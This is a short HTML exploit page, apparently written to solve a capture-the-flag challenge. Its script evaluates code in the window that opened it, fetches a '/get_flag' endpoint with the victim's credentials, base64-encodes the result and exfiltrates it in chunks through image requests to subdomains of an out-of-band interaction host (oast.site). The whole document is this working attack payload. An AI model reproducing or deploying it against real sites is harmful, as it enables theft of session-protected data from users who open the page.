<!DOCTYPE html>
<html>
<body>
<script>
if (window.opener) {
  window.opener.eval(`
    fetch('/get_flag', { credentials: 'include' })
      .then(r => r.text())
      .then(flag => {
        let encoded = btoa(flag).replace(/=/g, ''); // remove padding
        let chunks = encoded.match(/.{1,32}/g);
        for (let i = 0; i < chunks.length; i++) {
          let subdomain = chunks[i] + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
          let img = document.createElement('img');
          img.src = 'http://' + subdomain + '/';
          document.body.appendChild(img);
        }
      });
  `);
}
</script>
</body>
</html>